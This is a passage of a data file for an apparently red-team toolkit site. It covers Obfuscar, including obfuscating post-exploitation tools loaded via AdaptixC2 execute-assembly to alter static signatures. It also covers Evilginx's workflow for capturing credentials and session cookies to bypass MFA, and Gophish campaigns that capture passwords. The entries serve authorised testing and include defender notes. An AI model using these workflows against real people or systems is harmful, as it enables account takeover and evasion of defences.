            "columns": [
              "Mechanism",
              "Use it for"
            ],
            "rows": [
              [
                "<SkipNamespace name= />",
                "Leave a whole namespace (DTOs, models) untouched. name= supports * glob; rx= takes a regex."
              ],
              [
                "<SkipType name= />",
                "Keep a specific type's name — reflection, DI registration, plugin contracts."
              ],
              [
                "<SkipMethod type= name= />",
                "Keep a method's name (serialization callbacks, handlers bound by name)."
              ],
              [
                "<SkipProperty type= name= />",
                "Keep property names — JSON/XML serialization, data binding."
              ],
              [
                "<SkipField type= name= /> / <SkipEvent type= name= />",
                "Keep a field or event by name."
              ],
              [
                "<SkipStringHiding type= />",
                "Don't encrypt string literals in this type (e.g. resource keys read at runtime)."
              ],
              [
                "attrib= / typeattrib= / inherits= / static=",
                "Narrow any Skip rule by visibility (public/private/...), declaring-type visibility, base type, or static-ness."
              ],
              [
                "<ForceType name= />",
                "Force a type to be processed that a broader rule would otherwise skip."
              ],
              [
                "<AssemblySearchPath path= /> / <Include path= />",
                "Resolve dependencies from extra folders; pull in a shared config fragment (both absolute paths)."
              ],
              [
                "[Obfuscation(Exclude = true)]",
                "Attribute on a type/member to skip it; ApplyToMembers = true cascades to its members. (System.Reflection.ObfuscationAttribute — no extra reference needed.)"
              ],
              [
                "MarkedOnly = true",
                "Invert the model: obfuscate ONLY members marked with [Obfuscation], and leave everything else alone."
              ]
            ]
          },
          {
            "title": "Marking code with attributes",
            "type": "commands",
            "commands": [
              {
                "label": "Exclude from the source with the standard .NET attribute",
                "cmd": "using System.Reflection;\n\n// keep this type AND all its members (reflection / plugin contract)\n[Obfuscation(Exclude = true, ApplyToMembers = true)]\npublic class PluginContract { /* ... */ }\n\n// keep a single member (ApplyToMembers is irrelevant on a member)\n[Obfuscation(Exclude = true)]\npublic string ConfigKey { get; set; }\n\n// note: a bare [Obfuscation] defaults to Exclude = true, i.e. it excludes."
              },
              {
                "label": "MarkedOnly mode — opt-in instead of opt-out",
                "cmd": "<!-- in obfuscar.xml -->\n<Var name=\"MarkedOnly\" value=\"true\" />\n\n// now ONLY members you explicitly mark for renaming are touched:\n[Obfuscation(Exclude = false, ApplyToMembers = true)]\ninternal class SecretBits { /* renamed */ }\n// everything without an [Obfuscation(Exclude=false)] is left as-is."
              }
            ]
          },
          {
            "title": "Use it on a C# project (after build)",
            "type": "commands",
            "commands": [
              {
                "label": "Manual pipeline",
                "cmd": "dotnet build -c Release\nobfuscar.console obfuscar.xml\n# ship bin\\Obfuscated\\MyApp.dll ; keep Mapping.txt privately to decode crash stacks"
              },
              {
                "label": "Wire it as a post-build step in the .csproj",
                "cmd": "<!-- runs obfuscar after every Release build of this project -->\n<Target Name=\"Obfuscate\" AfterTargets=\"Build\" Condition=\"'$(Configuration)' == 'Release'\">\n  <Exec Command=\"obfuscar.console obfuscar.xml\" WorkingDirectory=\"$(ProjectDir)\" />\n</Target>"
              },
              {
                "label": "What you get",
                "cmd": "# OutPath now holds the obfuscated MyApp.dll (+ any processed deps)\n# plus Mapping.txt  (old name -> new name, for your own debugging)"
              }
            ]
          },
          {
            "title": "Using Obfuscar with AdaptixC2",
            "type": "commands",
            "commands": [
              {
                "label": "Why the two meet",
                "cmd": "# AdaptixC2 agents can run a .NET assembly in memory via the Extension-Kit's\n# Execution-BOF:   execute-assembly [--async] <assembly.exe> [args]\n# Many C# post-ex tools (Seatbelt, Rubeus, SharpHound, Certify) and in-house\n# tooling are ordinary .NET assemblies, so the SAME build-time obfuscation\n# above applies to a red-team tool exactly as it does to a product."
              },
              {
                "label": "Obfuscate the tool, then load it (authorised testing)",
                "cmd": "# 1. build the C# tool, then run Obfuscar over its output assembly\nobfuscar.console tool-obfuscar.xml      # -> bin\\Obfuscated\\Seatbelt.exe\n\n# 2. in the AdaptixC2 beacon console, run the obfuscated build in-process\nexecute-assembly /opt/tools/Seatbelt.exe -group=user"
              },
              {
                "label": "Build caveats that bite here",
                "cmd": "# - TEST the obfuscated build with its real arguments first.\n# - Tools that map CLI options to field/property names by reflection, or use\n#   reflection internally, can break under RenameFields/RenameProperties —\n#   exclude those with a Skip rule or [Obfuscation(Exclude=true)].\n# - The entry point still works: execute-assembly invokes the assembly's\n#   EntryPoint token, which Obfuscar updates when it renames."
              }
            ]
          },
          {
            "title": "What obfuscation does and does not change",
            "type": "notes",
            "items": [
              "It changes static indicators: renaming removes meaningful symbol names, and HideStrings removes readable string literals — so signatures keyed on those no longer match, and a recovered sample is harder to read.",
              "It does NOT bypass AMSI or behavioural EDR. With AdaptixC2's execute-assembly the CLR is loaded in-process and AMSI still scans the assembly bytes; run-time behaviour (API calls, child processes, network) is unchanged. Obfuscar is one layer, not an evasion tool.",
              "Defender's view: the HideStrings decryptor stub and Obfuscar's naming scheme are themselves fingerprintable, and the higher-signal detections are in-process CLR load (clr.dll/clrjit.dll appearing in a non-.NET process) and the AMSI assembly scan — hunt those rather than the tool's original strings.",
              "See the AdaptixC2 toolkit entry for execute-assembly and the Extension-Kit."
            ]
          },
          {
            "title": "C and native code — what Obfuscar does NOT do",
            "type": "notes",
            "items": [
              "Obfuscar is a .NET-only tool. It operates on managed assemblies — the IL and metadata emitted by the C#, VB.NET or F# compilers. There is nothing in it for native code.",
              "C or C++ compiled to native machine code (a plain .exe/.dll with no CLR metadata) has no managed type/method names to rename, so Obfuscar cannot process it and rejects it as not a valid .NET assembly. Protecting native code needs a native obfuscator/packer — a different class of tool.",
              "Mixed projects: if a .NET app P/Invokes a native C DLL, only the managed assembly is obfuscated; the native DLL is left as-is. P/Invoke keeps working — Obfuscar can rename the managed method, but the native entry point is named by the DllImport attribute, which is preserved.",
              "So read the title's 'C#' as the real target. 'C' here is only to say explicitly: native C/C++ is out of scope for Obfuscar."
            ]
          },
          {
            "title": "Verify the result",
            "type": "commands",
            "commands": [
              {
                "label": "Smoke-test, then inspect in a decompiler",
                "cmd": "dotnet bin\\Obfuscated\\MyApp.dll          # confirm the obfuscated build still runs\n# open the original and obfuscated DLL side by side in ILSpy / dnSpy:\n#   - private type/method names are now a, b, c... (or unprintable)\n#   - the Strings view is empty where HideStrings encrypted literals\n#   - Mapping.txt maps every old name -> new name"
              }
            ]
          },
          {
            "title": "Troubleshooting",
            "type": "table",
            "columns": [
              "Symptom",
              "Cause / fix"
            ],
            "rows": [
              [
                "\"Path specified by InPath variable must exist\"",
                "Point InPath at the real build output folder, as an absolute path; build the project first."
              ],
              [
                "\"Module file attribute must be an absolute path\"",
                "Use absolute paths. $(...) substitution and %ENV% expansion were removed; relative paths are deprecated."
              ],
              [
                "Tool works before obfuscation but not after",
                "Reflection resolved a renamed name. Exclude the reflected types/members with a Skip rule or [Obfuscation(Exclude=true)], or keep that assembly's public API."
              ],
              [
                "MissingMethod/MissingField at runtime",
                "A member referenced by string name was renamed — add it to the exclusions; test with the real inputs."
              ],
              [
                "Invalid strong-name / Authenticode signature",
                "Sign AFTER obfuscating — obfuscation rewrites the assembly and invalidates an earlier signature."
              ],
              [
                "WPF: resource or binding not found",
                "Enable AnalyzeXaml and/or Skip the types the XAML references by name."
              ]
            ]
          },
          {
            "title": "Notes & gotchas",
            "type": "notes",
            "items": [
              "Reflection breaks silently: anything that resolves a type or member by string name (DI containers, JSON/XML serializers, XAML, Type.GetType, Activator.CreateInstance) must be excluded, or it fails only at runtime.",
              "Sign AFTER obfuscating: obfuscation rewrites the assembly, so strong-name or Authenticode signing must run on the obfuscated output.",
              "Keep Mapping.txt private but safe: it de-obfuscates your own crash dumps. Ship the obfuscated DLL; archive the mapping somewhere only you can read.",
              "Paths: $(...) variable substitution and %ENV% expansion are no longer supported, and relative paths are deprecated — use absolute paths (InPath must exist).",
              "It's obfuscation, not encryption: a determined analyst can still recover logic. Never rely on it to hide hard-coded secrets — don't ship secrets in the binary at all.",
              "Run Obfuscar only on assemblies you trust — it parses PE/metadata with APIs that are not hardened against malicious input."
            ]
          },
          {
            "title": "References",
            "type": "references",
            "items": [
              {
                "label": "Obfuscar — GitHub (MIT)",
                "url": "https://github.com/obfuscar/obfuscar"
              },
              {
                "label": "Obfuscar — documentation",
                "url": "https://docs.obfuscar.com/"
              },
              {
                "label": "Obfuscar — official site",
                "url": "https://www.obfuscar.com/"
              },
              {
                "label": "Obfuscar.GlobalTool on NuGet",
                "url": "https://www.nuget.org/packages/Obfuscar.GlobalTool/"
              },
              {
                "label": "System.Reflection.ObfuscationAttribute (.NET docs)",
                "url": "https://learn.microsoft.com/dotnet/api/system.reflection.obfuscationattribute"
              },
              {
                "label": "Toolkit — AdaptixC2 (execute-assembly / Extension-Kit)",
                "url": "tool-detail.html?tool=adaptix-c2"
              }
            ]
          }
        ]
      }
    ]
  },
  {
    category: "Phishing",
    tools: [
      {
        id: "evilginx2",
        name: "Evilginx",
        url: "https://github.com/kgretzky/evilginx",
        description: "Reverse-proxy man-in-the-middle phishing framework that captures credentials and session cookies, bypassing most MFA.",
        brief: "Evilginx (v3 of the project formerly called Evilginx2) is a standalone reverse-proxy phishing framework. Instead of a fake HTML clone, it proxies the real login site to the victim, so everything looks authentic; as the victim authenticates it transparently harvests their username, password, AND the post-authentication session cookies. Because it steals the issued session token, it defeats most second factors (TOTP, push, SMS) — the attacker imports the cookies and is already logged in. It is driven by 'phishlets' (YAML site configs) and 'lures' (the links you send), and is strictly for authorized red-team/social-engineering engagements.",
        quickReference: [
          { label: "Set the base domain / IP", cmd: "config domain phish.example\nconfig ipv4 external <your-ip>" },
          { label: "Point a phishlet at a hostname", cmd: "phishlets hostname o365 login.phish.example" },
          { label: "Enable a phishlet (fetches certs)", cmd: "phishlets enable o365" },
          { label: "Create and read a lure", cmd: "lures create o365\nlures get-url 0" }
        ],
        sections: [
          { title: "Console Workflow", type: "commands", commands: [
            { label: "1. Configure the server", cmd: "# in the evilginx console:\nconfig domain phish.example      # your phishing base domain\nconfig ipv4 external <your-ip>   # public IP the domain points at" },
            { label: "2. Load and enable a phishlet", cmd: "phishlets               # list available phishlets\nphishlets hostname o365 login.phish.example\nphishlets enable o365    # obtains Let's Encrypt certs automatically" },
            { label: "3. Create a lure (the link you send)", cmd: "lures create o365\nlures edit 0 redirect_url https://real-site/after-login\nlures get-url 0          # the URL to deliver to the target" },
            { label: "4. Collect captured sessions", cmd: "sessions                 # list captured sessions\nsessions 1               # show tokens/cookies for session 1\n# import the cookies into your browser to ride the authenticated session" }
          ] },
          { title: "Phishlets", type: "table", columns: ["Concept", "Detail"],
            rows: [
              ["Phishlet", "A YAML config describing how to proxy a specific target site"],
              ["hostname", "The phishing hostname a phishlet is served on (must resolve to you)"],
              ["enable", "Activates the phishlet and provisions TLS certificates"],
              ["lure", "A generated link/path that starts the proxied login for a victim"],
              ["session", "A captured victim session: credentials + cookies/tokens"]
            ] },
          { title: "Notes & Tips", type: "notes", items: [
            "Authorized engagements only — Evilginx captures real credentials and live sessions, so use it strictly within a scoped, written social-engineering authorization.",
            "It bypasses MFA by stealing the SESSION COOKIE, not the second factor; the defensive takeaway is phishing-resistant auth (FIDO2/WebAuthn, passkeys) and token binding.",
            "You need a domain you control and DNS A records pointing at the server; enabling a phishlet provisions certificates automatically.",
            "Custom or updated phishlets are often required as target login flows change; test them against a controlled account first.",
            "Evilginx 3.x added a GUI and tighter Gophish integration for managing lures and campaigns."
          ] },
          { title: "References", type: "references", items: [
            { label: "Evilginx — GitHub", url: "https://github.com/kgretzky/evilginx" },
            { label: "Evilginx documentation", url: "https://help.evilginx.com/" }
          ] }
        ]
      },
      {
        id: "gophish",
        name: "Gophish",
        url: "https://github.com/gophish/gophish",
        description: "Open-source phishing-campaign framework — email templates, landing pages, sending profiles, and result tracking.",
        brief: "Gophish is an open-source framework for running and measuring phishing campaigns in authorized security-awareness and red-team work. It provides a web dashboard and REST API to manage sending profiles (SMTP), email templates, landing pages (which can capture submitted data), target groups, and campaigns — then tracks opens, clicks, and submitted credentials with per-recipient timelines. It focuses on the awareness/metrics side of phishing; pair it with Evilginx when a campaign needs live credential/session capture.",
        quickReference: [
          { label: "Run the server", cmd: "./gophish   # admin UI on https://127.0.0.1:3333 (creds printed on first run)" },
          { label: "Core building blocks", cmd: "Sending Profile (SMTP) -> Email Template -> Landing Page -> Users & Groups -> Campaign" },
          { label: "Capture submitted data", cmd: "Landing Page -> enable 'Capture Submitted Data' (+ 'Capture Passwords')" },
          { label: "API example", cmd: "curl -k -H 'Authorization: Bearer <api-key>' https://127.0.0.1:3333/api/campaigns/" }
        ],
        sections: [
          { title: "Campaign Building Blocks", type: "table", columns: ["Component", "Purpose"],
            rows: [
              ["Sending Profile", "The SMTP relay/credentials Gophish sends mail through"],
              ["Email Template", "The phishing email (HTML/text, {{.FirstName}} etc. variables, tracking)"],
              ["Landing Page", "The page the link leads to; can clone a site and capture submitted data"],
              ["Users & Groups", "Target recipients, imported via CSV or the API"],
              ["Campaign", "Ties the above together, schedules sending, and records results"]
            ] },
          { title: "Workflow", type: "commands", commands: [
            { label: "1. Start Gophish", cmd: "./gophish\n# note the randomly generated admin password in the console output\n# log in at https://127.0.0.1:3333 and change it" },
            { label: "2. Build the pieces", cmd: "# in the UI, create in order:\n# Sending Profile (SMTP) -> Email Template -> Landing Page -> Users & Groups" },
            { label: "3. Launch and track", cmd: "# Campaigns > New Campaign: pick the template, page, profile, group, URL\n# the dashboard then tracks Sent / Opened / Clicked / Submitted Data per user" }
          ] },
          { title: "Notes & Tips", type: "notes", items: [
            "Authorized awareness/red-team use only, with written approval and a defined recipient scope.",
            "'Capture Submitted Data' (and optionally passwords) on the landing page is what records credential entry — handle any captured data securely and purge it after the engagement.",
            "The {{.Tracker}} pixel and unique per-user URLs drive the open/click metrics; keep them in templates.",
            "Gophish measures human susceptibility; it does not defeat MFA — combine with Evilginx when live session capture is in scope.",
            "Run it behind a redirector and use a warmed sending domain with proper SPF/DKIM/DMARC for realistic deliverability testing."
          ] },
          { title: "References", type: "references", items: [
            { label: "Gophish — GitHub", url: "https://github.com/gophish/gophish" },
            { label: "Gophish documentation", url: "https://docs.getgophish.com/" }
          ] }
        ]
      }
    ]
  }
];